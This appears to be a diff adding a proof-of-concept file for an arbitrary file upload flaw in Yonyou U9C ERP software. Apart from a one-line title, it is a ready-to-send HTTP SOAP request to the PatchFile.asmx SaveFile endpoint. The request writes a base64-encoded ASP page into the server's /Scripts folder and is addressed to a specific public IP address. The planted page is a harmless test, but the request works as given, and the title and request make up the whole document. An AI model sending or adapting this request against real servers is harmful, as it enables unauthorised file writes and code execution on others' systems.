@@ -1,0 +1,17 @@
+# 用友U9C任意文件上传
+POST /CS/Office/AutoUpdates/back/PatchFile.asmx HTTP/1.1
+Host: 121.37.200.223
+Content-Type: text/xml; charset=utf-8
+Content-Length: 428
+SOAPAction: "http://tempuri.org/SaveFile"
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<SaveFile xmlns="http://tempuri.org/">
+<binData>IDwlIHJlc3BvbnNlLndyaXRlKCJvbmx5IHRlc3QiKSU+</binData>
+<path>/Scripts</path>
+<fileName>ttt666.asp</fileName>
+</SaveFile>
+</soap:Body>
+</soap:Envelope>
